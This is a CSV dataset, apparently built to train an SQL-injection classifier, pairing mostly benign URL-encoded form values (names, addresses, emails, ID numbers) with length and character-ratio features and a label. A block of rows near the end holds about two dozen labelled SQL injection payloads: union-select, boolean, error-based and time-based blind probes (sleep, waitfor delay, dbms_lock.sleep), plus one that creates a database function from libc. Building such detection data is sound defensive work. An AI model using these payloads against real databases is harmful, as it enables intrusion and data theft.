payload,payload_len,alpha,non_alpha,attack_feature,label
spiegel-haake%40convention.no,27,100.0,0.0,0.0,0
62145911a,9,100.0,0.0,0.0,0
travesia%20barrionuevo%2C%2049,24,100.0,0.0,0.0,0
turcia,6,100.0,0.0,0.0,0
7.73869E+15,16,68.75,31.25,45.45454545454545,0
daisey,6,100.0,0.0,0.0,0
r92e1%2A56e,9,100.0,0.0,0.0,0
2925,4,100.0,0.0,0.0,0
doris,5,100.0,0.0,0.0,0
pu6ue97,7,100.0,0.0,0.0,0
bergad%20faix,11,100.0,0.0,0.0,0
sibirskaia%40euskalcasino.es,26,100.0,0.0,0.0,0
72367579b,9,100.0,0.0,0.0,0
c/%20lope%20de%20rueda%20s/n%2C%209-f,25,100.0,0.0,0.0,0
alcntar,7,100.0,0.0,0.0,0
1.72128E+15,16,68.75,31.25,45.45454545454545,0
lozier,6,100.0,0.0,0.0,0
alguese,7,100.0,0.0,0.0,0
starr-fjelmose%40cdgranadabaila.travel,36,100.0,0.0,0.0,0
30482828p,9,100.0,0.0,0.0,0
c/%20ulises%2017%2C,13,100.0,0.0,0.0,0
47815,5,100.0,0.0,0.0,0
rube,4,100.0,0.0,0.0,0
enlutada,8,100.0,0.0,0.0,0
2354,4,100.0,0.0,0.0,0
blount,6,100.0,0.0,0.0,0
sugesto,7,100.0,0.0,0.0,0
raian,5,100.0,0.0,0.0,0
suau,4,100.0,0.0,0.0,0
germain%40elcorteitaliano.cat,27,100.0,0.0,0.0,0
78977050h,9,100.0,0.0,0.0,0
c/%20de%20la%20sabina%2C%20s/n%208%3Fb,24,100.0,0.0,0.0,0
betelu,6,100.0,0.0,0.0,0
24224,5,100.0,0.0,0.0,0
mcglynn,7,100.0,0.0,0.0,0
midkiff_mikuni%40directoriogratuito.kh,36,100.0,0.0,0.0,0
58772485x,9,100.0,0.0,0.0,0
calle%20rascafria%2C%20103%2C,21,100.0,0.0,0.0,0
gimialcn,8,100.0,0.0,0.0,0
39515,5,100.0,0.0,0.0,0
3.5822E+15,16,62.5,37.5,60.0,0
sprouse,7,100.0,0.0,0.0,0
zanquita,8,100.0,0.0,0.0,0
1827,4,100.0,0.0,0.0,0
addons,6,100.0,0.0,0.0,0
14ab214c6n,10,100.0,0.0,0.0,0
karla,5,100.0,0.0,0.0,0
jauregui%20cortines,17,100.0,0.0,0.0,0
quartet%40cabare.com.cs,21,100.0,0.0,0.0,0
86800649y,9,100.0,0.0,0.0,0
paratge%20lila%2030%2C%2010%3Fc,21,100.0,0.0,0.0,0
espluga%20de%20francol%20l%27,21,95.23809523809523,4.761904761904773,5.000000000000012,0
9.09145E+15,16,68.75,31.25,45.45454545454545,0
dyck,4,100.0,0.0,0.0,0
acre,4,100.0,0.0,0.0,0
pereda%20barrio,13,100.0,0.0,0.0,0
barrymore%40hipermadrid.pe,24,100.0,0.0,0.0,0
52137467d,9,100.0,0.0,0.0,0
doctor%20waksmann%2C%20120%2C%207%3Fb,25,100.0,0.0,0.0,0
caudete,7,100.0,0.0,0.0,0
31282,5,100.0,0.0,0.0,0
3.16175E+15,16,68.75,31.25,45.45454545454545,0
chao,4,100.0,0.0,0.0,0
62si27t8ico,11,100.0,0.0,0.0,0
4403,4,100.0,0.0,0.0,0
patacki,7,100.0,0.0,0.0,0
encrasar,8,100.0,0.0,0.0,0
xifr,4,100.0,0.0,0.0,0
pleasande%40doloresmusculares.aq,30,100.0,0.0,0.0,0
86943454g,9,100.0,0.0,0.0,0
sanchez%2049%2C,11,100.0,0.0,0.0,0
9.00808E+15,16,68.75,31.25,45.45454545454545,0
lubna,5,100.0,0.0,0.0,0
o%2Bbispar,8,100.0,0.0,0.0,0
adgardo,7,100.0,0.0,0.0,0
pealver%20palenzuela,18,100.0,0.0,0.0,0
36914497a,9,100.0,0.0,0.0,0
nucleo%20santiago%20apostol%2034%2C%204%3Ff,31,100.0,0.0,0.0,0
zabalza,7,100.0,0.0,0.0,0
20491,5,100.0,0.0,0.0,0
4.81172E+15,16,68.75,31.25,45.45454545454545,0
erickson,8,100.0,0.0,0.0,0
inord2n6da7e401,15,100.0,0.0,0.0,0
5445,4,100.0,0.0,0.0,0
procacci,8,100.0,0.0,0.0,0
a65esad0,8,100.0,0.0,0.0,0
efrn,4,100.0,0.0,0.0,0
conde,5,100.0,0.0,0.0,0
calle%20castaos%2090,16,100.0,0.0,0.0,0
torre-cardela,13,100.0,0.0,0.0,0
25330,5,100.0,0.0,0.0,0
4.86728E+15,16,68.75,31.25,45.45454545454545,0
oran,4,100.0,0.0,0.0,0
mialgi5,7,100.0,0.0,0.0,0
tesisteco%20avi,13,100.0,0.0,0.0,0
pepet%40naturalchild.co,21,100.0,0.0,0.0,0
pablo%20iglesias%20s/n%202%3Ff,22,100.0,0.0,0.0,0
1308,5,80.0,20.0,25.0,0
6.70256E+15,16,68.75,31.25,45.45454545454545,0
technoso,8,100.0,0.0,0.0,0
remante,7,100.0,0.0,0.0,0
919,3,100.0,0.0,0.0,0
briseboi,8,100.0,0.0,0.0,0
afoscarse,9,100.0,0.0,0.0,0
net.valdez%40salaparis.gt,23,100.0,0.0,0.0,0
39699852n,9,100.0,0.0,0.0,0
c/ja%20del%20indiano%2C%20s/n%2C,22,100.0,0.0,0.0,0
illano,6,100.0,0.0,0.0,0
37115,5,100.0,0.0,0.0,0
2.87295E+15,16,68.75,31.25,45.45454545454545,0
spears,6,100.0,0.0,0.0,0
comisorio,9,100.0,0.0,0.0,0
triana,6,100.0,0.0,0.0,0
del%20ngel%20kercad,15,100.0,0.0,0.0,0
pesche%40campodegolf.com.sy,25,100.0,0.0,0.0,0
10421521z,9,100.0,0.0,0.0,0
etorbidea%20askatasuna%20170%2C%208%3Fa,29,100.0,0.0,0.0,0
valseca,7,100.0,0.0,0.0,0
2.75401E+15,16,68.75,31.25,45.45454545454545,0
huong,5,100.0,0.0,0.0,0
419747iv6,9,100.0,0.0,0.0,0
1729,4,100.0,0.0,0.0,0
tse,3,100.0,0.0,0.0,0
orientalista,12,100.0,0.0,0.0,0
victoria%20de%20los%20angeles,23,100.0,0.0,0.0,0
ventura%20motn,12,100.0,0.0,0.0,0
sala%40mystyleperfume.ls,22,100.0,0.0,0.0,0
roure%2C%2043%2C%203%3Fd,14,100.0,0.0,0.0,0
32648,5,100.0,0.0,0.0,0
7.77188E+15,16,68.75,31.25,45.45454545454545,0
meggy,5,100.0,0.0,0.0,0
3o22ciabl3,10,100.0,0.0,0.0,0
telema,6,100.0,0.0,0.0,0
ayat%20rozas,10,100.0,0.0,0.0,0
verani%40viajesdacapalla.gq,25,100.0,0.0,0.0,0
25109956m,9,100.0,0.0,0.0,0
quinita%20flores%2075%2C,18,100.0,0.0,0.0,0
botarell,8,100.0,0.0,0.0,0
45370,5,100.0,0.0,0.0,0
3.89386E+15,16,68.75,31.25,45.45454545454545,0
etchieso,8,100.0,0.0,0.0,0
arrego76arse,12,100.0,0.0,0.0,0
9159,4,100.0,0.0,0.0,0
marieann,8,100.0,0.0,0.0,0
1i6p06ej7,9,100.0,0.0,0.0,0
penarroya%20ingla,15,100.0,0.0,0.0,0
gayle%40freetag.name,18,100.0,0.0,0.0,0
54709157t,9,100.0,0.0,0.0,0
el%20halcon%20154%2C%208%3Ff,18,100.0,0.0,0.0,0
3314,5,80.0,20.0,25.0,0
1.57126E+15,16,68.75,31.25,45.45454545454545,0
evin,4,100.0,0.0,0.0,0
sa6r2,5,100.0,0.0,0.0,0
sibonet,7,100.0,0.0,0.0,0
gorcy.davis%40carmensanmartin.bo,30,100.0,0.0,0.0,0
16601924h,9,100.0,0.0,0.0,0
estrada%20mendiarte%20s/n%2C%2010%3Fa,27,100.0,0.0,0.0,0
destriana,9,100.0,0.0,0.0,0
25307,5,100.0,0.0,0.0,0
sa89gn,6,100.0,0.0,0.0,0
9639,4,100.0,0.0,0.0,0
longo,5,100.0,0.0,0.0,0
cojera,6,100.0,0.0,0.0,0
armero%20filippi,14,100.0,0.0,0.0,0
uzaki%4023horas.ie,16,100.0,0.0,0.0,0
calle%20madagascar%20130,20,100.0,0.0,0.0,0
24391,5,100.0,0.0,0.0,0
lei-see,7,100.0,0.0,0.0,0
ineluctable,11,100.0,0.0,0.0,0
rahue,5,100.0,0.0,0.0,0
serna%20kovac,11,100.0,0.0,0.0,0
pozzetto%40miplat.am,18,100.0,0.0,0.0,0
51795949h,9,100.0,0.0,0.0,0
calle%20del%20derecho%2017%2C,21,100.0,0.0,0.0,0
cervera%20de%20la%20caada,19,100.0,0.0,0.0,0
50693,5,100.0,0.0,0.0,0
9.47354E+15,16,68.75,31.25,45.45454545454545,0
havis,5,100.0,0.0,0.0,0
7a2a6t1ro,9,100.0,0.0,0.0,0
1858,4,100.0,0.0,0.0,0
cooksey,7,100.0,0.0,0.0,0
pavorde,7,100.0,0.0,0.0,0
elois,5,100.0,0.0,0.0,0
gomero%20gallardo,15,100.0,0.0,0.0,0
terrio%40likeanangel.dz,21,100.0,0.0,0.0,0
46773841y,9,100.0,0.0,0.0,0
paratge%20ter%2C%2033%2C,16,100.0,0.0,0.0,0
arndiga,7,100.0,0.0,0.0,0
8.55461E+15,16,68.75,31.25,45.45454545454545,0
vial,4,100.0,0.0,0.0,0
muntaner%20nevado,15,100.0,0.0,0.0,0
vasilescu.lisi%40drogasvirtuales.sc,33,100.0,0.0,0.0,0
37905890g,9,100.0,0.0,0.0,0
luis%20braille%2C%2033%2C%2012%3Fd,22,100.0,0.0,0.0,0
matar,5,100.0,0.0,0.0,0
40529,5,100.0,0.0,0.0,0
4.60806E+15,16,68.75,31.25,45.45454545454545,0
werling,7,100.0,0.0,0.0,0
encalador,9,100.0,0.0,0.0,0
7012,4,100.0,0.0,0.0,0
barnhill,8,100.0,0.0,0.0,0
ten.tar,7,100.0,0.0,0.0,0
quintilio,9,100.0,0.0,0.0,0
naharro,7,100.0,0.0,0.0,0
vitola%4023horas.ad,17,100.0,0.0,0.0,0
38980059g,9,100.0,0.0,0.0,0
calle%20isis%2C%20180,15,100.0,0.0,0.0,0
45810,5,100.0,0.0,0.0,0
6.1724E+15,16,62.5,37.5,60.0,0
janeva,6,100.0,0.0,0.0,0
desconsolar,11,100.0,0.0,0.0,0
lzaro,5,100.0,0.0,0.0,0
hinwood-laretei%40addl.es,23,100.0,0.0,0.0,0
infante%20juan%20manuel%20s/n%205%3Fa,27,100.0,0.0,0.0,0
canfranc,8,100.0,0.0,0.0,0
26323,5,100.0,0.0,0.0,0
9.73807E+15,16,68.75,31.25,45.45454545454545,0
radioelctrica,13,100.0,0.0,0.0,0
3679,4,100.0,0.0,0.0,0
blondell3,9,100.0,0.0,0.0,0
apotrerar,9,100.0,0.0,0.0,0
mochn%20quer,10,100.0,0.0,0.0,0
peller%40arvigar.gs,17,100.0,0.0,0.0,0
30503437d,9,100.0,0.0,0.0,0
carrer%20asturies%2C%2049,19,100.0,0.0,0.0,0
49135,5,100.0,0.0,0.0,0
8.58253E+15,16,68.75,31.25,45.45454545454545,0
aghili,6,100.0,0.0,0.0,0
escultrico,10,100.0,0.0,0.0,0
colunga%20corrius,15,100.0,0.0,0.0,0
bukoontot%40google-movil.cm,25,100.0,0.0,0.0,0
69634179t,9,100.0,0.0,0.0,0
c/%20asuncion%20115%205e,18,100.0,0.0,0.0,0
almonacid%20de%20la%20sierra,22,100.0,0.0,0.0,0
6.68969E+15,16,68.75,31.25,45.45454545454545,0
rorke,5,100.0,0.0,0.0,0
3u23pe,6,100.0,0.0,0.0,0
3318,4,100.0,0.0,0.0,0
philippa,8,100.0,0.0,0.0,0
carroar,7,100.0,0.0,0.0,0
salgado%20pladellorens,20,100.0,0.0,0.0,0
schwab.carli%40emepleo.info,25,100.0,0.0,0.0,0
calle%20batalla%20de%20muhlberg%2C%2025%2C%206%3Fa,34,100.0,0.0,0.0,0
villadoz,8,100.0,0.0,0.0,0
27860,5,100.0,0.0,0.0,0
brenda,6,100.0,0.0,0.0,0
8ienne2s6,9,100.0,0.0,0.0,0
alpar-ornstein%40rockefeller.nu,29,100.0,0.0,0.0,0
15423399j,9,100.0,0.0,0.0,0
horcajo%20de%20montemayor,21,100.0,0.0,0.0,0
46844,5,100.0,0.0,0.0,0
gourley,7,100.0,0.0,0.0,0
sensualmente,12,100.0,0.0,0.0,0
consalve,8,100.0,0.0,0.0,0
c406l2n5,8,100.0,0.0,0.0,0
fabrizio,8,100.0,0.0,0.0,0
kunneke%40storagecraft.nz,23,100.0,0.0,0.0,0
89740217j,9,100.0,0.0,0.0,0
c/%20gravina%2C%20s/n,15,100.0,0.0,0.0,0
igzquiza,8,100.0,0.0,0.0,0
17867,5,100.0,0.0,0.0,0
6.45367E+15,16,68.75,31.25,45.45454545454545,0
zandra,6,100.0,0.0,0.0,0
agenor,6,100.0,0.0,0.0,0
iraola%20rudi,11,100.0,0.0,0.0,0
chamberlain%40muevemiweb.al,25,100.0,0.0,0.0,0
calle%20jaime%20ferranz%2051,22,100.0,0.0,0.0,0
castellanos%20de%20zapardiel,24,100.0,0.0,0.0,0
12163,5,100.0,0.0,0.0,0
1%27%20where%206406%3D6406%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,115,86.95652173913044,13.043478260869565,60000.0,1
1%29%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%284666%3D4666,111,87.38738738738738,12.612612612612612,90000.0,1
-3136%25%27%29%20or%203400%3D6002,21,76.19047619047619,23.809523809523807,30000.0,1
1%29%20where%207956%3D7956%20or%20sleep%285%29%23,31,83.87096774193549,16.129032258064516,60000.0,1
-7387%27%29%29%29%20order%20by%201--,22,68.18181818181817,31.818181818181817,30000.0,1
1%27%29%29%20as%20gfzb%20where%207904%3D7904%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,60,80.0,20.0,30000.0,1
1%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%23,37,83.78378378378379,16.216216216216218,60000.0,1
-5622%22%20where%207970%3D7970%20union%20all%20select%207970%2C7970%2C7970%2C7970%2C7970--,66,86.36363636363636,13.636363636363635,90000.0,1
1%22%29%29%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20and%20%28%28%22smnw%22%20like%20%22smnw,227,72.68722466960352,27.312775330396477,120000.0,1
-9860%25%22%20union%20all%20select%206996%2C6996%2C6996%2C6996%2C6996%2C6996%23,55,83.63636363636363,16.363636363636363,60000.0,1
1%29%29%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual%20and%20%28%287240%3D7240,101,74.25742574257426,25.742574257425744,60000.0,1
-2604%29%29%20as%20sekb%20where%206897%3D6897%20or%201000%3D7683,44,88.63636363636364,11.363636363636363,60000.0,1
1%25%22%29%29%29%20waitfor%20delay%20%270%3A0%3A5%27--,30,63.33333333333333,36.666666666666664,30000.0,1
1%22%29%20as%20nraw%20where%207984%3D7984%20and%20elt%283114%3D3114%2Csleep%285%29%29%23,56,82.14285714285714,17.857142857142858,60000.0,1
1%27%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end%20and%20%28%27jzlr%27%3D%27jzlr,51,74.50980392156863,25.49019607843137,30000.0,1
1%25%22%29%3Bselect%20benchmark%285000000%2Cmd5%280x714e4153%29%29%23,47,80.85106382978722,19.148936170212778,23.68421052631581,1
1%27%29%29%29%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,103,79.6116504854369,20.388349514563107,60000.0,1
1%25%22%29%29%29%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29%20and%20%28%28%28%22%25%22%3D%22,134,77.61194029850746,22.388059701492537,90000.0,1
-4259%27%29%29%20as%20usqu%20where%205419%3D5419%20or%20elt%288325%3D8837%2C8837%29--,57,80.7017543859649,19.298245614035086,60000.0,1
1%27%29%29%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%28%27ijyi%27%3D%27ijyi,124,83.87096774193549,16.129032258064516,90000.0,1
-1638%27%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar,203,60.09852216748769,18.226600985221676,30000.0,1
-2583%22%29%20where%203455%3D3455%20or%20make_set%289354%3D9354%2C7185%29--,53,79.24528301886792,20.754716981132077,60000.0,1
-6267%22%29%29%29%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%,209,56.45933014354066,18.660287081339714,30000.0,1
1%25%22%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,104,79.8076923076923,20.192307692307693,25.30120481927711,1
1%25%27%29%29%29%20and%208148%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,69,71.01449275362319,28.985507246376812,39000.0,1
8.49643E+15,16,68.75,31.25,45.45454545454545,0
tweddle,7,100.0,0.0,0.0,0
t324a3ra5a,10,100.0,0.0,0.0,0
4932,4,100.0,0.0,0.0,0
sirevici,8,100.0,0.0,0.0,0
di0cut6dor7,11,100.0,0.0,0.0,0
jener%20monaj,11,100.0,0.0,0.0,0
90230020p,9,100.0,0.0,0.0,0
los%20polancos%20133,16,100.0,0.0,0.0,0
pintanos%2C%20los,13,100.0,0.0,0.0,0
6.03487E+15,16,68.75,31.25,45.45454545454545,0
berrisfo,8,100.0,0.0,0.0,0
zaguero,7,100.0,0.0,0.0,0
vingelli9%40custombikesclothes.fr,31,100.0,0.0,0.0,0
39202408n,9,100.0,0.0,0.0,0
c/%20montaer%20ruiz%2C%2024%2C%2012a,24,100.0,0.0,0.0,0
fuentelmonge,12,100.0,0.0,0.0,0
3.60984E+15,16,68.75,31.25,45.45454545454545,0
isador,6,100.0,0.0,0.0,0
m%2Aule38,7,100.0,0.0,0.0,0
4906,4,100.0,0.0,0.0,0
marcanti,8,100.0,0.0,0.0,0
cimorra,7,100.0,0.0,0.0,0
jezabel,7,100.0,0.0,0.0,0
pawluszek%20segu,14,100.0,0.0,0.0,0
knippenberg%40soyriojano.cf,25,100.0,0.0,0.0,0
05782219l,9,100.0,0.0,0.0,0
c/%20ricardo%20codoer%2C%20112%2C,23,100.0,0.0,0.0,0
